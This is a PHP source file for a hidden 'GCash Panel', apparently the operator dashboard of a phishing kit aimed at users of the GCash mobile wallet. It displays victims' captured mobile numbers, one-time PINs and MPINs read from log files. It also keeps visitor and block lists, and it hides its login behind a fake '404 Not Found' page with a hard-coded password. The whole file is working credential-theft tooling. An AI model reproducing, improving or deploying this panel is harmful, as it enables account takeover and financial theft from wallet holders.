<?php
session_start();
error_reporting(0);
set_time_limit(0);
ini_set("memory_limit",-1);
$password = "awithaha";


if(!empty($password) and $_SESSION[$sessioncode] != $password){
	
	if (isset($_REQUEST['pass']) and $_REQUEST['pass'] == $password) {
		$_SESSION[$sessioncode] = $password;
	}
	else {
		print "
		
		<html><head>
		<title>404 Not Found</title>
		</head><body>
		<form method=post><input type='password' name='pass'style='border:none;float:right;'></form>
		</body></html>
		";
		exit;        
	}
}
?>
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="5;" />
  <title>GCash Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1">



</head>
<body bgcolor="black" onload="startTime()">
  <style type="text/css">
.container {
  display: flex;
}
.container > div {
  flex: 1; /*grow*/
}
::-webkit-scrollbar {width: 10px;}
::-webkit-scrollbar-track {}
::-webkit-scrollbar-thumb { background:lime; }
::-webkit-scrollbar-thumb:hover {background: lime;}
    *{
        font-family: "Lucida Console", Courier, monospace;
        box-sizing: border-box;
    }
    #visitor-panel{
      background: black;
      border: 1px solid lime;
      padding-left:1%;
      padding-bottom:1%;
      margin:1%;
      width: 800px;
      height: 500px;
      color: lime;
      /**float: left;**/

    }
    #visitor-panelx{
      background: black;
      border: 1px solid lime;
      padding-left:1%;
      padding-bottom:1%;
      margin:1%;
      width: 2400px;
      height: 600px;
      color: lime;
      float: left;
      

    }


        #visitor-error{
      background: black;
      border: 1px solid red;
      padding-left:1%;
      padding-bottom:1%;
      margin:1%;
      width: 450px;
      color: lime;
      float: left;

    }

    #title{
      color:lime;
      margin-left: 44px;
      border-left:5px solid red;
      padding-left: 4px;
    }
          #x2{
      color:gray;
      margin-left: 25px;
      padding-left: 4px;
            float: left;

    }
      
    #visitor{
        overflow: scroll;
        height: 150px;
        overflow-x: hidden; 
       
    }
    #login{
        overflow: scroll;
		height: 400px;
        overflow-x: hidden; 
       
    }
    #number{
        overflow: scroll;
		height: 400px;
        overflow-x: hidden; 
       
    }    
    #panel::after{
      content: "";
      clear: both;
      display: table;
    }
    #otp{
        overflow: scroll;
		height: 400px;
        overflow-x: hidden; 
       
    }
  </style>
    <h1 id="title">GCash PANEL </h1>
        <div id="panel">


    <p id='x2'>Visitors:       <?php 
        $file = "visits.txt";
        $filex = file_get_contents($file);
        $no_of_lines =count(file($file))/2;
        echo $no_of_lines;
        $check =  substr($filex, 0, 11);
        ?>
          | Last Visit: <?php echo $check; ?>
        </p>

 


      </div>

    <div id="panel">




<div class="container">
   <div id="visitor-panel">
        <p style="color:red;">Mobile Numbers: <?php 
        $file = "numbers.txt";
        $no_of_lines =floor(count(file($file)));
        echo $no_of_lines;
        ?></p>
           <div id="login">
      <?php include 'numbers.txt';?>
           </div>

   </div>
   <div id="visitor-panel">
        <p style="color:red;">One-Time PIN: <?php 
        $file = "otps.txt";
        $no_of_lines =floor(count(file($file)));
        echo $no_of_lines;
        ?></p>
           <div id="otp">
      <?php include 'otps.txt';
      echo ' <script>
        $(document).ready(function() {
            $("button").click(function() {
                $(document).scrollTop($(document).height());
            });
        });
    </script>';?>
           </div>

   </div>
   </div>

<div class="container">

   <div id="visitor-panel">
        <p style="color:red;">MPIN: <?php 
        $file = "mpin.txt";
        $no_of_lines =floor(count(file($file)));
        echo $no_of_lines;
        ?></p>
           <div id="otp">
      <?php include 'mpin.txt';
      ?>
           </div>

   </div>
   
   <div id="visitor-panel">
   <p style="color:red;">Block Access: <?php 
   $file = "block.txt";
   $no_of_lines =floor(count(file($file)));
   echo $no_of_lines;
   ?></p>
   <div id="otp">
   <?php include 'block.txt';
   ?>
   </div>
   
   </div>
   </div>

   <div id="visitor-panelx">
   <p style="color:red;">Visitors: <?php 
   $file = "visits.txt";
   $no_of_lines =floor(count(file($file))/2);
   echo $no_of_lines;
   ?></p>
   <div id="otp">
   <?php include 'visits.txt';?>
   </div>
   
   </div>




    </div>
</body>
</html>
